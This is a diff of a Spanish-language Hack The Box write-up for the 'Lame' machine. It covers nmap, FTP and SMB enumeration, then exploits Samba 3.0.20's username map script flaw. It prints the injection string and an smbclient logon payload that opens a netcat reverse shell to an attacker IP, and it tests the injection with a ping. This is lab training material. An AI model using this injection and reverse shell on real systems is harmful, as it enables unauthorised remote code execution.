@@ -1,5 +1,4 @@
 ip -> 10.10.10.3
-ports -> 22,21,139,445,3632
 
 ```
 └─$ nmap -sCV -T5 10.10.10.3 -Pn -v
@@ -10,7 +9,7 @@ ports -> 22,21,139,445,3632
 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
 ```
 
-El puerto Ftp esta abierto para *anonymous*
+El puerto Ftp esta abierto para *anonymous*  
 ```
 └─$ ftp 10.10.10.3
 Name (10.10.10.3:cucuxii): anonymous
@@ -20,7 +19,7 @@ ftp> dir
 150 Here comes the directory listing.
 226 Directory send OK.
 ```
-No hay nada, asi que probaré el smb
+No hay nada, asi que probaré el smb   
 ```
 └─$ crackmapexec smb 10.10.10.3
 SMB     10.10.10.3   445  LAME  [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
@@ -44,8 +43,8 @@ smb: \> dir
   5573.jsvc_up                        R        0  Thu Oct  6 19:19:00 2022
   vgauthsvclog.txt.0                  R     1600  Thu Oct  6 19:17:54 2022
 ```
-Ninguno de esos archivos sirve (son todo logs de VMware y demas)
-No tenemos web, asi que hay que tirar de las versiones de los servicios a ver si hay alguna vulnerable.
+Ninguno de esos archivos sirve (son todo logs de VMware y demas)  
+No tenemos web, asi que hay que tirar de las versiones de los servicios a ver si hay alguna vulnerable.  
 
 ```
 └─$ searchsploit Samba 3.0.20-Debian
@@ -53,18 +52,13 @@ Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
 └─$ searchsploit -m unix/remote/16320.rb
 ```
 
-El exploit tira de metasploit, pero en una linea pone tal que
-```username = "/=`nohup " + payload.encoded + "`" ```
-
-Busque en google -> smb vuln nohup y me salio esta
-[web](https://pentesting.mrw0l05zyn.cl/explotacion/servicios/445-tcp-smb)
-
+El exploit tira de metasploit, pero en una linea pone tal que: ```username = "/=`nohup " + payload.encoded + "`" ``` o sea ```"/=`nohup comando`"```
+Busque en google -> *smb vuln nohup* y me salio esta [web](https://pentesting.mrw0l05zyn.cl/explotacion/servicios/445-tcp-smb)
 ```
 smbclient //<target>/tmp
 logon "./=`nohup nc -e /bin/sh <attacker-IP-address> <listen-port>`"
 nc -lvnp <listen-port>
 ```
-
 ```
 └─$ smbclient //10.10.10.3/tmp -N 
 smb: \> logon "./=`nohup ping -c 1 10.10.14.10`"
